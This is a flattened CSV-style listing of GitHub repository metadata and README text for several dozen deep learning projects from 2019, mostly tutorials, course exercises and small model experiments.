afrazchelsea,ML-DL-Research-Papers,n/a,ML DL Research Papers Repository for research papers project ideas in Machine Learning and Deep Learning Use this repository to make your first contribution to an open source project on GitHub Practice making your first pull request to a public repository before doing the real thing Celebrate Hacktoberfest https hacktoberfest digitalocean com by getting involved in the open source community by completing some simple tasks in this project This repository is open to all members of the GitHub community Any member may contribute to this project without being a collaborator https github com afrazchelsea ML DL Research Papers What is Hacktoberfest A month long celebration from October 1st 31st sponsored by Digital Ocean and GitHub to get people involved in Open Source Create your very first pull request to any public repository on GitHub and contribute to the open source developer community https hacktoberfest digitalocean com How to contribute to this repository Add a Machine Learning Deep Learning research paper you have published read or worked on before Choose one or many make a pull request for your work and wait for it to be merged Getting started 1 Fork this repository Click the Fork button in the top right of this page click your Profile Image 2 Clone your fork down to your local machine git clone fork link git 3 Create a branch git checkout b branch name 4 Make your changes add a paper 5 Commit and push bash git add git commit m Commit message git push origin branch name 6 Create a new pull request from your forked repository Click the New Pull Request button located at the top of your repo 7 Wait for your PR review and merge approval 8 Star this repository if you had fun,2019-10-05T21:12:39Z,2019-10-19T11:17:26Z,n/a,afrazchelsea,User,1,1,2,23,master,afrazchelsea#Nisag#yash-bansod#yosiasm,4,0,0,3,0,1,4
AndresJejen,TensorFlow-2.0-to-AWS-EC2-Inception-V3-Model,colombia#deep#learning#tensorflow,TensorFlow 2 to Production AWS EC2 DOCKER Description Here you can find the code for Ruta de aprendizaje en Deep Learning Parte 2 Modelo Tensorflow en produccin AWS follow all these steps and enjoy tensorflow Instructions 1 You must have installed virtualenv and Python3 Im using Ubuntu 18 on Windows Subsystem Linux clone this repo Im working on my disk partition D on WSL cd mnt d git clone https github com AndresJejen TensorFlow 2 0 to AWS EC2 Inception V3 Model git cd TensorFlow 2 0 to AWS EC2 Inception V3 Model 2 run this code on root project folder to create the virtual environment virtualenv env python python3 and activate the virtual env source env bin activate 3 Install al dependencies pip install r requirements txt 4 Save the Model format pb python3 download InceptionV3 py 5 run the Server with Docker You must install docker docker run t rm p 8501 8501 v mnt d TensorFlow 2 0 to AWS EC2 Inception V3 Model modelTF models ImageClassifier name Test e MODELNAME ImageClassifier tensorflow serving 6 create your own querys python3 client py i vaso jpg Deploy on AWS EC2 1 Create Your AWS ACCOUNT 2 Create a Virtual Machine and install docker 3 Clone your code fron GitHub to AWS EC2 4 Start your server 5 Query from your own pc AWESOME LINKS https www tensorflow org tfx serving setup https towardsdatascience com deploying keras models using tensorflow serving and flask 508ba00f1037 https github com Hvass Labs TensorFlow Tutorials blob master 01SimpleLinearModel ipynb Thanks If you like please clap the Medium Article Share and lets learn together Colombia AI Twitter andresjejen Mision de los setenta La mies a la verdad es mucha mas los obreros pocos por tanto rogad al Seor de la mies que enve obreros a su mies,2019-10-10T19:28:25Z,2019-10-13T23:47:43Z,Python,AndresJejen,User,1,1,0,5,master,AndresJejen,1,0,0,0,0,0,0
adykaaa,MachineLearning-DeepLearning-stuff,n/a,,2019-09-28T19:16:44Z,2019-10-16T16:20:02Z,Python,adykaaa,User,1,1,0,3,master,adykaaa,1,0,0,0,0,0,0
CVerRobin,DeepLearning,n/a,md You can use the editor on GitHub https github com CVerRobin DeepLearning edit master README md to maintain and preview the content for your website in Markdown files Whenever you commit to this repository GitHub Pages will run Jekyll https jekyllrb com to rebuild the pages in your site from the content in your Markdown files Markdown Markdown is a lightweight and easy to use syntax for styling your writing It includes conventions for markdown Syntax highlighted code block Header 1 Header 2 Header 3 Bulleted List 1 Numbered 2 List Bold and Italic and Code text Link url and Image src For more details see GitHub Flavored Markdown https guides github com features mastering markdown Jekyll Themes Your Pages site will use the layout and styles from the Jekyll theme you have selected in your repository settings https github com CVerRobin DeepLearning settings The name of this theme is saved in the Jekyll config yml configuration file Support or Contact Having trouble with Pages Check out our documentation https help github com categories github pages basics or contact support https github com contact and well help you sort it out,2019-10-14T12:43:17Z,2019-10-15T01:11:36Z,n/a,CVerRobin,User,0,1,0,16,master,CVerRobin,1,0,0,0,0,0,0
kart-projects,DeepLearning,n/a,DeepLearning Table of Contents 1 Installation installation 2 Motivation motivation 3 File Descriptions files 4 Licensing Authors and Acknowledgements licensing Installation The python notebook files in this repo should run with Anaconda distribution of Python versions 3 To explore this project please download the dataset iris csv and the python notebook You can either upload the files using Jupyter notebook which will automatically place these files in the current working directory of your Python installation or place these files in the current working directory and then run the notebooks Hint To check for the current working directory using the available notebooks just type os getcwd in a cell and run it If you would like to change the current working directory before running these notebooks use the os chdir function e g if your current working path is c projects the statement you would want to execute is os chdir c 92 92projects Project Motivation For this project I was interested in learning the concepts of DeepLearning from scratch We will begin with the simplest Neural Network the Perceptron and explore our way to finally building a gigantic DeepLearning network to do Image processing File Descriptions There are two main files in this repo 1 iris csv The dataset we will start exploring 2 Perceptron ipynb The first python notebook to begin our journey to master DeepLearning concepts Here we will explore the Perceptron model the simplest Neural Network model that we can build Licensing Authors Acknowledgements Please feel free to use the code here as you would like,2019-09-24T02:09:34Z,2019-12-09T21:59:18Z,Jupyter Notebook,kart-projects,User,1,1,0,6,master,kart-projects,1,0,0,0,0,0,0
akshayjaryal603,DeepLearning,n/a,,2019-09-29T09:46:14Z,2019-10-05T13:08:48Z,Jupyter Notebook,akshayjaryal603,User,1,1,0,1,master,akshayjaryal603,1,0,0,0,0,0,0
Justin-A,DeepLearning,deeplearning#python#pytorch#tensorflow,DeepLearning Framework TensorFlow 2 0 PyTorch 1 2 Concept Basic Advanced Model of Deep Learning,2019-10-31T14:36:51Z,2019-12-13T15:05:15Z,Jupyter Notebook,Justin-A,User,1,1,0,19,master,Justin-A,1,0,0,0,0,0,0
DandeOne,DeepLearning,n/a,,2019-09-22T17:18:07Z,2019-11-25T18:18:06Z,Jupyter Notebook,DandeOne,User,1,1,0,6,master,DandeOne,1,0,0,0,0,0,0
shadow1666,DeepLearning,n/a,,2019-10-10T11:42:50Z,2019-10-10T14:07:39Z,n/a,shadow1666,User,1,1,0,0,master,,0,0,0,0,0,0,0
MrOnie,DeepLearning,n/a,,2019-11-01T16:16:39Z,2019-11-11T14:10:42Z,Jupyter Notebook,MrOnie,User,1,1,0,4,master,MrOnie,1,0,0,0,0,0,0
dumin199101,DeepLearning,n/a,DeepLearning amp amp,2019-10-23T08:26:59Z,2019-12-13T09:44:32Z,Python,dumin199101,User,1,1,0,29,master,dumin199101,1,0,0,0,0,0,0
TheFigher,DeepLearning,n/a,DeepLearning,2019-10-21T06:44:38Z,2019-12-04T07:38:19Z,n/a,TheFigher,User,1,1,0,1,master,TheFigher,1,0,0,0,0,0,0
957001934,DeepLearning,n/a,svm Tensorflow https tensorflow google cn pytorch tensorflow https gss1 bdstatic com 9vo3dSagxI4khGkpoWK1HF6hhy baike crop 3D11 2C0 2C577 2C380 3Bc0 3Dbaike80 2C5 2C5 2C80 2C26 sign 9d229876eecd7b89fd2360c33215738b b219ebc4b74543a9cb03627016178a82b9011475 jpg https keras io zh keras https gss1 bdstatic com 9vo3dSagxI4khGkpoWK1HF6hhy baike c0 3Dbaike150 2C5 2C5 2C150 2C50 sign 65d2001ef5edab64607f4592965fc4a6 9f2f070828381f3028f9f37ca7014c086f06f007 jpg repository AlexNetVGGInceptionResNetDenseNet AI https tianchi aliyun com course courseConsole spm 5176 12282070 0 0 5e8d2042j9nhIv courseId 198 chapterIndex 4 sectionIndex 10,2019-10-14T11:26:07Z,2019-10-21T08:32:05Z,Python,957001934,User,1,1,0,39,master,957001934,1,0,0,0,0,0,0
VaasuDevanS,DeepLearning,artificial-intelligence#cnn#deeplearning#keras#movie-review-classifier#python36#resnet-50#rnn,DeepLearning My works during Fall 19 term at UNB in DeepLearning field,2019-10-29T15:19:40Z,2019-12-15T03:28:40Z,Jupyter Notebook,VaasuDevanS,User,0,1,1,10,master,VaasuDevanS,1,0,0,0,0,0,0
Walekova,DeepLearning,n/a,DeepLearning,2019-09-23T17:59:02Z,2019-11-26T21:12:28Z,Jupyter Notebook,Walekova,User,3,1,0,59,master,Walekova,1,0,0,0,0,0,0
whiplash98,DeepLearning-ImageRecognition,n/a,DeepLearning ImageRecognition Consists work on short MOOC on lynda,2019-11-01T12:55:57Z,2019-11-02T04:43:42Z,n/a,whiplash98,User,1,1,0,1,master,whiplash98,1,0,0,0,0,0,0
EvilPsyCHo,DeepLearningEnvironments,cuda#cudnn#deep-learning#deepin#environment#jupyter-notebook#keras#nvidia#pytorch#tensorflow#toturial#ubuntu#windows,Build Your DeepLearning Environments Easily CUDA cudNN OS Test Passing GPU CUDA Toturial Version Ubuntu 16 04 RTX 20 Series 10 1 CN EN ubuntu16 04cuda10 1 en md Ubuntu 18 04 Windows 10 deepin 15 11 Work Space Jupyter Notebook jupyter md Tools Git git md Welcome your contribution Contact me evilpsycho42 gmail com,2019-10-24T17:48:11Z,2019-10-28T16:08:01Z,Jupyter Notebook,EvilPsyCHo,User,1,1,0,5,master,EvilPsyCHo,1,0,0,0,0,0,0
BgR8,TensorFlow-DeepLearning,deeplearning#keras-tensorflow#neural-networks#python#tensorflow#tensorflow-examples,,2019-09-26T12:42:51Z,2019-09-30T15:54:04Z,Jupyter Notebook,BgR8,User,1,1,0,1,master,BgR8,1,0,0,0,0,0,0
paulonteri,Tensorflow-DeepLearning,n/a,,2019-09-22T07:42:50Z,2019-10-11T03:19:56Z,Jupyter Notebook,paulonteri,User,1,1,1,13,master,paulonteri,1,0,0,0,0,0,0
nikraftarf,Smile-Detection-DeepLearning,n/a,Smile Detection DeepLearning For this project you need these packages Torch CV2 PIL Numpy OS facerecognition This project was my internship project that was about detecting smile laugh and poker faces I have used torch library and resnet34 pretrained model for training my model You can find the main dataset which contains not resized and non cropped images hereunder face https user images githubusercontent com 41823988 66033776 d197bd80 e514 11e9 94d4 49c884606810 gif https drive google com open id 1qQgzHkYmKueY8tyh0f32EIq0Bohoyuvl main py contains main code for train the dataset The dataset contains cropped faces from a main dataset that have croped with facedetection py code The dataset have 3 classes laugh poker and smile Laugh and smile folders have about 900 images and poker folder has 373 images Change your path for training the model The resize py is a code for resize all images in a folder and the facerecognition py is a code for cropping faces from all images After running the main py you have a myresnet34lr0 03SGDmodel pth file and you will use it in Predict image py code for predicting your images The output of predict image py is like the picture below Screenshot 26 https user images githubusercontent com 41823988 66072569 244b9680 e562 11e9 860b b59cd634d509 png Enjoy Deep Learning,2019-10-02T09:38:44Z,2019-10-02T18:53:45Z,Python,nikraftarf,User,1,1,0,14,master,nikraftarf,1,0,0,0,0,0,0
SONMOOK-OH,Coursework_DeepMachineLearning,n/a,CourseworkDeepMachineLearning Coursework TeamProject,2019-09-27T05:11:33Z,2019-10-01T04:52:00Z,Python,SONMOOK-OH,User,1,1,0,5,master,SONMOOK-OH,1,0,0,0,0,0,0
acetinkaya,DeepLearningTurkiye,n/a,eitli ktphaneler kullanlarak Trke kod aklamalaryla pratik derin renme uygulamalar alma Deep Learning Trkiye topluluu tarafndan desteklenmektedir Nasl Katkda Bulunabilirim Orjinal derin renme rnek kodlarn alp repomuza Trke aklamalar ile eklenmesine destek vermek isteyenler bu linkten https github com deeplearningturkiye pratik derin ogrenme uygulamalari blob master Nas C4 B1lKatk C4 B1daBulunabilrim md nasl katkda bulunabileceklerini renebilirler MNIST Modified National Institute of Standards and Technology Veriseti Keras Evriimli Sinir Alar CNN ile Rakam Tanma MNIST veriseti KERAS ktphanesi https github com deeplearningturkiye pratik derin ogrenme uygulamalari blob master KERAS rakamtanimaCNNMNIST py ok Katmanl Alglayc MLP ile Rakam Tanma MNIST veriseti KERAS ktphanesi https github com deeplearningturkiye pratik derin ogrenme uygulamalari blob master KERAS rakamtanimaMLPMNIST py Evriimli Sinir Alar CNN ile Obje Tanma Fashion MNIST veriseti KERAS ktphanesi https github com deeplearningturkiye pratik derin ogrenme uygulamalari blob master KERAS CNNFashionMnist py Jupyter Notebook rnekleri Obje Tanma Fashion MNIST veriseti https github com deeplearningturkiye pratik derin ogrenme uygulamalari blob master KERAS notebooks CNNFashionMnist ipynb Google colab zerinde altrmak iin Tklaynz https colab research google com github deeplearningturkiye pratik derin ogrenme uygulamalari blob master KERAS notebooks CNNFashionMnist ipynb Colab kullanm hakknda detayl bilgi iin Tklaynz https medium com deep learning turkiye google colab ile C3 BCcretsiz gpu kullan C4 B1m C4 B1 30fdb7dd822e PyTorch Evriimli Sinir Alar CNN ile Rakam Tanma MNIST veriseti PyTorch ktphanesi https github com deeplearningturkiye pratik derin ogrenme uygulamalari blob master PyTorch rakamtanimaCNNMNIST py CIFAR10 Canadian Institute for Advanced Research Veriseti Keras Evriimli Sinir Alar CNN ile Nesne Tanma CIFAR10 veriseti KERAS ktphanesi https github com deeplearningturkiye pratik derin ogrenme uygulamalari blob master KERAS nesnetanimaCNNCIFAR10 py https github com deeplearningturkiye pratik derin ogrenme uygulamalari web adresinden bu almalar alnmtr,2019-10-29T20:28:20Z,2019-10-30T11:51:49Z,Jupyter Notebook,acetinkaya,User,0,1,0,72,master,deeplearningturkiye#hacertilbec#yavuzKomecoglu#ardamavi#meltemiatay#acetinkaya#canumay#mburakergenc,8,0,0,0,0,0,0
Smartuil,DeepLearning-AI,deeplearning,DeepLearning AI deeplearning aihttps www deeplearning ai courserahttps www coursera org specializations deep learning https 163 lu nPtn42,2019-10-17T06:08:57Z,2019-11-30T06:14:30Z,Jupyter Notebook,Smartuil,User,1,1,0,12,master,Smartuil,1,0,0,0,0,0,0
PengboLiu,Practice-for-DeepLearning,deep-learning#nlp#python#pytorch,Practice for DeepLearning Some exercises on deep learning mainly about NLP requirement PyTorch Neural Machine Translation RNN Attention https github com PengboLiu Practice for DeepLearning blob master Neural 20Machine 20Translation RNN 2BAttention py paper Neural Machine Translation by Jointly Learning to Align and Translate https arxiv org abs 1409 0473 Transformer paper Attention Is All You Need https arxiv org abs 1706 03762 Text Classification Data set vocabulary and pre training word embedding TextCNN paper Convolutional Neural Networks for Sentence Classification https www aclweb org anthology D14 1181,2019-09-25T10:25:11Z,2019-11-11T17:24:30Z,Python,PengboLiu,User,1,1,0,11,master,PengboLiu,1,0,0,0,0,0,0
Clack2David,DeepLearningNote_Pytorch,n/a,,2019-10-16T06:58:06Z,2019-11-29T07:42:50Z,Jupyter Notebook,Clack2David,User,1,1,0,16,master,Clack2David,1,0,0,0,0,0,0
ikukang,DeepLearningWithPythonKeras,n/a,DeepLearningWithPythonKeras 1 2 3 Add,2019-10-19T08:07:38Z,2019-11-18T19:37:46Z,n/a,ikukang,User,1,1,0,46,master,ikukang,1,0,0,1,0,1,0
UsamaI000,DeepLearning-TensorFlow-Python,n/a,DeepLearning TensorFlow Python What is Artificial Intelligence Making a machine do the tasks that usually requires human intelligence to be solved NLP Robotics Self Driving vehicles Expert Systems are some domains of AI What is the relation between AI ML and DL AI is a bigger domain which is related with solving real life problems Machine learning like a brain for AI it deals with the learning process and then making decisions In ML model learns from the data Within ML Deep learning is further subset of ML DL is a an architecture which replicates the human brain with a neural network for decision making Machine Learning types Supervised Such a learning in which you have output labels to tune the model Examples are 1 Classification You have data your goal is to put an observation into a group e g cats and dogs classification 2 Regression You have to predict a real value based on some historical data e g predicting house prices Unsupervised Such a learning we only have input features not output labels Examples are 1 Clustering You have to find some similarties in data and make groups and relations based on those similarities 2 Association rule rule based machine learning method for discovering interesting relations between variables in large databases It is intended to identify strong rules discovered in databases using some measures of interestingness Reinforcement Such a learning in which agent learns from environment It follows reward and penalties method Examples are Making a dog follow your command and reward him if it follows If not penalize the dog Deep Q is an example of Reinforcement learning Algorithm What is Deep Learning Deep Learning is a branch of Machine Learning absed on a set of algorithms that attempt to model high level abstractions in the data by using a deep graph with multiple processing layers It is composed of multiple linear and non linear transformations Examples are 1 Automatic Machine Translation 2 Automatic Handwriting Generation 3 Character Text Generation 4 Automatic Game Playing 5 Object Classification in Images What is Cost in Machine Learning Cost is the measure of difference between the actual value and the predicted values is called Cost What is Optimization in Machine Learning Optimization is the process of updating the values of parameters so that the cost is lesser and predcted values are closer to the actual values What is Activation Function Activation functions are kind of mapping functions that translates the input into outputs It uses a threshold to produce an output Examples are 1 Linear f x x Used when we want to solve linear regression problem where we predict numerical value 2 Unit Step f x 0 if 0 x 1 if x 0 Used where we have to set some threshold like in binary classification problems 3 Sigmoid f x 1 1 e x Used when we want to map values to a value in the range 0 to 1 4 Tanh f x tanh x Used when we want to map valuein the range 1 and 1 5 ReLU f x 0 if x 0 Used when we want to map input values in the range of x and max 0 x It maps ve value to 0 6 Softmax Used when there are more than 2 classes it gives distribution for each class What are Tensors Tensors are the standard way of representing data in Deep Learning These are multi dimensional array so these numbers are represented in higher multi dimensional arrays Rank 0 is scalar Rank represent the dimensionality of things Rank 1 is vector Rank 2 is called Matrices Rank 3 is called Tensors In TensorFlow the data has to be converted into tensors before any kind of calculations What is TensorFlow TensorFlow is a Python based open source library for Machine Learning to implement deep networks In TensorFlow computation is reffered as dataflow graph There are two sections in TensorFlow 1 Tensors 2 Flow flow is the definition of graph like calculation and running the graph In TensorFlow there are three types of data objects 1 Constants Constant is a value that dosen t change float32 is default for constants 2 Placeholders Placeholder is a promise to provide a value later Most of the features and labels would be initiated as placeholder Placeholder comes with feeddict which would feed final values in form of dicitonary 3 Variables Variables allows us trainable parameter to the graph These values can be changed during the running of the program What is a perceptron A perceptron is a single layered single neuron which takes some input and produces an output A perceptron is a linear model used for binary classification It has two functions 1 Summation and 2 Transformation Activation What is Role of weights and biases Weights determine the slope of the classifier line that classifies data while bias is to shift the line forwad or backward What is Learning rate and Epochs Learning rate is the amount each weight is corrected each time it is updated The number of time to run through the training data while updating weight What is loss function A loss function measures how far apart the current model is from the provided data It measures how much the error is It tells how good or bad the model is What is Back propagation Back propagation allows us to find deltas for hidden layers It allows us to vary parameters Tracing the contribution of each unit hidden or not Backpropagation of errors is an algorithm for neural networks using gradient descent It consists of calculating the contribution of each parameter to the errors We backpropagate the errors through the net and update the parameters weights and biases accordingly Note The dataset is divided into three different parts 1 Training data 2 Validation data 3 Test data But for this data set must be large What happens if data set is very small If you divide that data set into 3 parts then there may be a chance that the model won t train properly Solution Solution to this problem is N fold Cross Validation Which is a strategy which combines training and validation What is Overfitting Overfitting is problem that our training set has focused on the particular training set so much it has missed the point Generalization is poor Random noise is captured too How to spot over fitting Validation data is what helps us to see if there is over fitting At some point validation loss could start increasing than the training loss At this point you should stop the training of model It is important that the model should not train on validation data What is Early Stopping Is a technique to prevent over fitting Common ways are 1 Train for preset number of epchs But not guarantee the min is reached 2 Stop when loss function updates become very small But can lead to over fitting 3 Third is Validation test strategy But may take long time What is Underfitting Underfitting is problem that the model has not captured the underlying logic of the data It doesn t know what to do and gives wrong answer High loss and low accuracy Test data is data which is used to measure predictive power after training and validation The accuracy of model on this data would equal to real life data Note Well trained model is somewhere between underfitted and overfitted model This fine balance is called Bias Variance dillema What is Standardization Feature scalling Standardization Feature scalling is the process of transforming the data we are working with into a standard scale e g subtracting the mean from original value and dividing by standard deviation In this way regardless of data set we ll always obtain a distribution with mean 0 and standard deviation 1 Other popular methods are L2 norm PCA or whitening How to encode categories in a useful way for ML There are two ways 1 One hot encoding Create values according to how many products Problem is it requires a lot of variables 2 Binary encoding Convert all categories in binary values But can be problematic because of correlations,2019-09-27T04:46:48Z,2019-09-29T13:13:11Z,Jupyter Notebook,UsamaI000,User,1,1,0,4,master,UsamaI000,1,0,0,0,0,0,0
mostofa-ahsan,DeepLearning---Natural-Language-Processing,n/a,Deep Learning This repository is a play space of my deep learning projects,2019-10-10T19:44:24Z,2019-12-01T05:14:08Z,Jupyter Notebook,mostofa-ahsan,User,1,1,0,14,master,mostofa-ahsan,1,0,0,0,0,0,0
shyamnathp,Deep-Learning,n/a,,2019-10-24T18:34:44Z,2019-12-11T17:25:08Z,Python,shyamnathp,User,3,1,1,24,master,shyamnathp#2kunal6,2,0,0,0,0,0,0
MartaMaleyka,Deep-Learning,n/a,,2019-10-02T16:32:52Z,2019-10-22T15:05:28Z,Jupyter Notebook,MartaMaleyka,User,2,1,0,1,master,MartaMaleyka,1,0,0,0,0,0,0
11aditya11,Deep_learning,n/a,,2019-10-30T20:24:54Z,2019-11-24T10:43:23Z,Jupyter Notebook,11aditya11,User,1,1,1,2,master,11aditya11,1,0,0,0,0,0,0
nkmah2,Deep-Learning,n/a,Deep Learning This repo contains projects using ConvNets List of projects Digit Recognition MINST Dataset Dog vs Cats Classification Small Dataset using Data Augmentaion and Dropout Dog vs Cats Classification Small Dataset Extracting Features of a Pretrained Network VGG16 Dog vs Cats Classification Small Dataset Fine Tuning Unfreezing layers of a Pretrained Network VGG16 Data and code in this repository were adapted from the following sources Deep Learning with Python Francois Cholet Deep Learning Specialization Coursera Andrew Ng Kaggle Competitions,2019-10-01T18:29:04Z,2019-10-20T22:49:34Z,Jupyter Notebook,nkmah2,User,1,1,0,27,master,nkmah2,1,0,0,0,0,0,0
barywhyte,Deep-Learning,deep-learning#natural-language-processing#sequence-models,Deep Learning,2019-10-05T08:59:23Z,2019-10-10T14:42:10Z,Jupyter Notebook,barywhyte,User,1,1,0,6,master,barywhyte,1,0,0,0,0,0,0
mohamed-amine-guerras,Deep-Learning,n/a,,2019-09-24T22:21:03Z,2019-11-16T14:31:30Z,n/a,mohamed-amine-guerras,User,1,1,0,0,master,,0,0,0,0,0,0,0
raoadnankhan,deep_learning,n/a,deeplearning,2019-10-17T18:51:44Z,2019-11-16T22:36:19Z,Jupyter Notebook,raoadnankhan,User,3,1,1,2,master,raoadnankhan,1,0,0,0,0,0,0
Cocogeek,Deep-Learning,n/a,Deep Learning These notebooks were carried out as part of my first year of master at Eurecom during the Deep Learning class They aimed at applying on concrete cases the methods seen during class These projects were realised in team with yasserben link of his github here https github com yasserben,2019-10-18T13:22:04Z,2019-10-21T09:29:59Z,Jupyter Notebook,Cocogeek,User,1,1,0,4,master,Cocogeek,1,0,0,0,0,0,0
InwaiCheong,Deep-Learning,n/a,,2019-10-22T03:51:03Z,2019-10-22T19:48:38Z,Jupyter Notebook,InwaiCheong,User,1,1,0,2,master,InwaiCheong,1,0,0,0,0,0,0
HarisH-Reddy-DS,Deep-Learning,n/a,,2019-10-23T18:41:39Z,2019-10-29T07:44:19Z,Jupyter Notebook,HarisH-Reddy-DS,User,1,1,0,1,master,HarisH-Reddy-DS,1,0,0,0,0,0,0
speedhot,Deep-Learning-,n/a,Deep Learning Introduction with Tensorflow 2 0 0 beta1 on MNIST Hand written digits and Fashion MNIST Datasets Initial to advanced Deep Learning Practice 1 Linear and Logistic Regression with Tensorflow 2 0 0 beta1 for classifying mnist hand written digits dataset https github com speedhot Deep Learning tree basics DL 2 Low Level Development of Simple Neural Network to classify MNIST hand Written Digits https github com speedhot Deep Learning blob master NNsimplelowlevelmnistdigit ipynb 3 Simple Neural Network formation with Tensorflow 2 0 0 beta1 for fashion MNIST dataset s images idendification https github com speedhot Deep Learning blob master NNsimpleonfashionmnist ipynb 4 Low Level Development of Simple Convolutional Neural Network to classify MNIST hand Written Digits https github com speedhot Deep Learning blob master CNN1basiclowlevelconvolutionneuralnetworkpracticeonMNISThandwrittendigits ipynb,2019-10-06T05:25:43Z,2019-10-17T13:21:43Z,Jupyter Notebook,speedhot,User,1,1,0,10,master,speedhot,1,0,0,0,0,0,0
anuscode,deep-learning,n/a,DCGAN Using Keras implemented the face book DCGAN paper The pictures below is the result of this DCGAN trained for the simpsons family Check out corresponding Kaggle simpson dataset Simpson Family https www kaggle com greg115 image generator dcgan the simpsons dataset Architecture Network architecture by Radford et al 2015 https arxiv org abs 1511 06434 Model Generator Layer type Output Shape Param dense1 Dense None 16384 1654784 relu1 ReLU None 16384 0 reshape1 Reshape None 4 4 1024 0 conv2dtranspose1 Conv2DTr None 8 8 512 13107200 batchnormalization1 Batch None 8 8 512 2048 relu2 ReLU None 8 8 512 0 conv2dtranspose2 Conv2DTr None 16 16 256 3276800 batchnormalization2 Batch None 16 16 256 1024 relu3 ReLU None 16 16 256 0 conv2dtranspose3 Conv2DTr None 32 32 128 819200 batchnormalization3 Batch None 32 32 128 512 relu4 ReLU None 32 32 128 0 conv2dtranspose4 Conv2DTr None 64 64 64 204800 batchnormalization4 Batch None 64 64 64 256 relu5 ReLU None 64 64 64 0 conv2dtranspose5 Conv2DTr None 64 64 32 51200 batchnormalization5 Batch None 64 64 32 128 relu6 ReLU None 64 64 32 0 conv2dtranspose6 Conv2DTr None 64 64 3 2403 Total params 19 120 355 Trainable params 19 118 371 Non trainable params 1 984 Model Discriminator Layer type Output Shape Param conv2d1 Conv2D None 32 32 64 4800 leakyrelu1 LeakyReLU None 32 32 64 0 conv2d2 Conv2D None 16 16 128 204800 batchnormalization6 Batch None 16 16 128 512 leakyrelu2 LeakyReLU None 16 16 128 0 conv2d3 Conv2D None 8 8 256 819200 batchnormalization7 Batch None 8 8 256 1024 leakyrelu3 LeakyReLU None 8 8 256 0 conv2d4 Conv2D None 4 4 512 3276800 batchnormalization8 Batch None 4 4 512 2048 leakyrelu4 LeakyReLU None 4 4 512 0 flatten1 Flatten None 8192 0 dense2 Dense None 1 8193 Total params 4 317 377 Trainable params 4 315 585 Non trainable params 1 792,2019-10-19T11:03:31Z,2019-11-12T14:11:15Z,Python,anuscode,User,1,1,0,8,master,anuscode,1,0,0,0,0,1,0
jimmy-academia,Deeper-Learnings,n/a,Deeper Learnings my tutorials for every programing problem I have while trying make my deep learning models work Techincal scrambles conda cheatsheet otherstuffs condacheatsheet jpeg setting up a server technical scrambles setup md simple acceleration for Pytorch technical scrambles simpleacc md wget google drive files not folder technical scrambles wgetgdrive md,2019-09-30T04:45:58Z,2019-10-30T04:00:51Z,Python,jimmy-academia,User,1,1,0,8,master,jimmy-academia#jimmytecho,2,0,0,0,0,0,0
sebastianhaeni,deep-learning,n/a,Deep Learning Course Exercises Exercises from a Master of Science Deep Learning course TSMDeLearn See https moodle msengineering ch report dbextend key TSMDeLearn edition 2019,2019-09-22T16:10:25Z,2019-11-24T19:37:50Z,Jupyter Notebook,sebastianhaeni,User,1,1,0,17,master,sebastianhaeni,1,0,0,0,0,0,0
heejung,deep-learning,n/a,deep learning Deep Learning applications including Computer Vision and Natural Language Processing Understanding applications Projects are suggested by Udacity udacity com Deep Learning 1 Predicting Bike Sharing Patterns Neural Networks Build and train a Neural Network from scratch to predict the number of bikeshare users on a given day 2 Dog Breed Classifier CNN Convolutional Neural Networks Build a pipeline to process real world user supplied images Given an image of a dog my CNN identifies an estimate of the canine s breed 3 Generate TV Script RNN LSTM Generate a TV script by defining and training a Recurrent Neural Network RNN such as Long term Short term Memory LSTM 4 Generate Faces GAN Generative Adversarial Networks Define two adversarial networks a generator and discriminator and train them until you can generate realistic faces 5 Deploying a Sentiment Analysis Model deploy on SageMaker Build and deploy a neural network which predicts the senstiment of a user provided movie review In addition create a simple web app that uses the deployed model Computer Vision 1 Facial Keypoint Detection CNN to detect facial keypoints Apply my knowledge of image processing and deep learning to create a CNN for facial keypoint eyes mouth nose etc detection 2 Image Captioning CNN Encoder RNN Decoder Train a CNN RNN model to predict captions for a given image by implementing an effective RNN decoder for a CNN encoder 3 Simultaneous Localization and Mapping SLAM Implement SLAM a robust method for tracking an object over time and mapping out its surrounding environment using elements of probability motion models andl inear algebra,2019-09-22T00:23:38Z,2019-09-22T02:33:50Z,HTML,heejung,User,1,1,0,13,master,heejung,1,0,0,0,0,0,0
s-rafiee,deeplearning,n/a,,2019-09-27T07:45:07Z,2019-11-29T11:25:24Z,n/a,s-rafiee,User,1,1,0,0,master,,0,0,0,0,0,0,0
Aixek,Deepin,n/a,Welcome to GitHub Pages You can use the editor on GitHub https github com Aixek Deepin edit master README md to maintain and preview the content for your website in Markdown files Whenever you commit to this repository GitHub Pages will run Jekyll https jekyllrb com to rebuild the pages in your site from the content in your Markdown files Markdown Markdown is a lightweight and easy to use syntax for styling your writing It includes conventions for markdown Syntax highlighted code block Header 1 Header 2 Header 3 Bulleted List 1 Numbered 2 List Bold and Italic and Code text Link url and Image src For more details see GitHub Flavored Markdown https guides github com features mastering markdown Jekyll Themes Your Pages site will use the layout and styles from the Jekyll theme you have selected in your repository settings https github com Aixek Deepin settings The name of this theme is saved in the Jekyll config yml configuration file Support or Contact Having trouble with Pages Check out our documentation https help github com categories github pages basics or contact support https github com contact and well help you sort it out,2019-10-30T04:40:01Z,2019-10-30T04:53:43Z,n/a,Aixek,User,1,1,0,5,master,Aixek,1,0,0,0,0,0,0
EricZhangSCUT,DeepPBS,n/a,,2019-10-20T07:11:12Z,2019-12-12T07:46:58Z,Python,EricZhangSCUT,User,1,1,0,1,master,ElvinJun,1,0,0,0,0,0,0
qixiuai,DeepInsight,deeplearning#tensorflow,DeepInsight A deep learning framework based on tensorflow Build model with the insight why it works and how Code based on transformer and tensor2tensor Features configs flags experiment save hyper parameters and results multidataset vision nlp physio distributed multi gpu tpu multi nodes shared models resnet etc transformer lstm centernet callbacks tensorboard plotly activation metrics f1 score confusion matrix losses focal loss serving,2019-09-21T10:20:34Z,2019-09-21T11:34:43Z,n/a,qixiuai,User,1,1,0,2,master,qixiuai,1,0,0,0,0,0,0
printfpark,KERAS,n/a,Tongue diagnosis Deep Learning AI Keras tensorflow CNN,2019-10-03T15:08:57Z,2019-11-08T14:25:08Z,Jupyter Notebook,printfpark,User,1,1,0,2,master,printfpark,1,0,0,0,0,0,0
GuilhermeViveiros,MachineLearning,n/a,MachineLearning Some problems solved with Deep Learning,2019-10-13T09:45:23Z,2019-10-13T09:49:21Z,n/a,GuilhermeViveiros,User,1,1,0,2,master,GuilhermeViveiros,1,0,0,0,0,0,0
